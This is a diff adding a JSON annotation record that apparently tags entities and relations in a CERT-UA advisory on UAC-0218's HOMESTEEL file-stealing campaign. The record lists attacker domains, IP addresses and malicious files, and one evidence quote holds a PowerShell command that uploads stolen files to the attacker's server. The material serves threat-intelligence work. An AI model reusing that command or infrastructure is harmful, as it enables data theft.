@@ -1,0 +1,279 @@
+{
+  "docId": 6281095,
+  "date": "24.10.2024",
+  "title": "Тематика рахунків на озброєнні UAC-0218: викрадення файлів за допомогою HOMESTEEL (CERT-UA#11717)",
+  "entities": [
+    {
+      "id": "6281095:0",
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe.",
+      "scheme": "S6",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:1",
+      "name": "UAC-0218",
+      "kind": "threat group",
+      "gloss": "A threat group tracked by CERT-UA for conducting cyberattacks against Ukrainian targets.",
+      "scheme": "S19",
+      "category": "HackerGroup",
+      "role": "attacker"
+    },
+    {
+      "id": "6281095:2",
+      "name": "eDisk",
+      "kind": "cloud service",
+      "gloss": "A cloud file storage service provided by Ukr.net.",
+      "scheme": "S21",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "6281095:3",
+      "name": "Договір20102024.doc",
+      "kind": "decoy document",
+      "gloss": "A password-protected decoy document distributed within malicious RAR archives.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6281095:4",
+      "name": "Рахунок20102024.xlsx",
+      "kind": "decoy document",
+      "gloss": "A password-protected decoy spreadsheet distributed within malicious RAR archives.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6281095:5",
+      "name": "Пароль.vbe",
+      "kind": "malicious script",
+      "gloss": "A malicious VBS script designed to search for and exfiltrate user files to a remote server.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "6281095:6",
+      "name": "WEXTRACT.EXE",
+      "kind": "executable file",
+      "gloss": "A standard Windows self-extracting archive utility used to execute PowerShell commands.",
+      "scheme": "S12",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "6281095:7",
+      "name": "HostZealot",
+      "kind": "hosting provider",
+      "gloss": "A web hosting and domain registration provider.",
+      "scheme": "S21",
+      "category": "Organization",
+      "role": "related"
+    },
+    {
+      "id": "6281095:8",
+      "name": "Python Software Foundation",
+      "kind": "software organization",
+      "gloss": "A non-profit organization dedicated to the development and promotion of the Python programming language.",
+      "scheme": null,
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "6281095:9",
+      "name": "BaseHTTP",
+      "kind": "software component",
+      "gloss": "A basic HTTP server implementation in Python.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "6281095:10",
+      "name": "_№_601.rar",
+      "kind": "malicious archive",
+      "gloss": "A malicious RAR archive distributed via phishing links to deliver scripts and decoy documents.",
+      "scheme": "S12",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "6281095:11",
+      "name": "install.txt",
+      "kind": "file",
+      "gloss": "A configuration or directive text file associated with a self-extracting executable.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:12",
+      "name": "POSTRUNPROGRAM",
+      "kind": "file",
+      "gloss": "A script or directive file executed after unpacking a self-extracting archive.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:13",
+      "name": "RUNPROGRAM",
+      "kind": "file",
+      "gloss": "A script or directive file executed upon unpacking a self-extracting archive.",
+      "scheme": "S12",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:14",
+      "name": "edisk.ukrnet.01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious subdomain used to host phishing archives impersonating eDisk.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "6281095:15",
+      "name": "ukrnet.01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious subdomain used as part of the attacker's delivery infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6281095:16",
+      "name": "01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious infrastructure in attacks tracked under UAC-0218.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6281095:17",
+      "name": "edisk.in.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious domain mimicking the eDisk service to distribute malware.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "6281095:18",
+      "name": "winupmirror.support",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used in the cyberattack infrastructure.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": null
+    },
+    {
+      "id": "6281095:19",
+      "name": "staticgl.one",
+      "kind": "internet domain",
+      "gloss": "A domain used as a command-and-control server and data exfiltration receiver.",
+      "scheme": "S15",
+      "category": "Domain",
+      "role": "related"
+    },
+    {
+      "id": "6281095:20",
+      "name": "109.205.195.233",
+      "kind": "ip address",
+      "gloss": "An IP address identified as a command-and-control server.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:21",
+      "name": "194.107.92.234",
+      "kind": "ip address",
+      "gloss": "An IP address identified as an originating address for phishing activity.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:22",
+      "name": "46.149.173.221",
+      "kind": "ip address",
+      "gloss": "An IP address identified as an originating address for phishing activity.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:23",
+      "name": "94.140.114.32",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "6281095:24",
+      "name": "94.140.114.76",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0218",
+      "type": "hosts-infrastructure-on",
+      "tail": "HostZealot",
+      "evidence": "Характерними ознаками управляючої інфраструктури є використанням реєстратора доменних імен HostZealot"
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Пароль.vbe",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки... а також VBS-скрипт \"Пароль.vbe\""
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Договір20102024.doc",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки (\"Договір20102024.doc\""
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Рахунок20102024.xlsx",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки... \"Рахунок20102024.xlsx\""
+    },
+    {
+      "head": "edisk.in.ua",
+      "type": "mimics-service",
+      "tail": "eDisk",
+      "evidence": "посиланням, нібито, на eDisk, для завантаження одноіменних RAR-архівів"
+    },
+    {
+      "head": "edisk.ukrnet.01mirror.com.ua",
+      "type": "mimics-service",
+      "tail": "eDisk",
+      "evidence": "посиланням, нібито, на eDisk, для завантаження одноіменних RAR-архівів"
+    },
+    {
+      "head": "UAC-0218",
+      "type": "uses-domain",
+      "tail": "staticgl.one",
+      "evidence": "iwr https://staticgl.one/$fil -Method POST"
+    }
+  ],
+  "unclassified": [
+    "6281095:8"
+  ]
+}
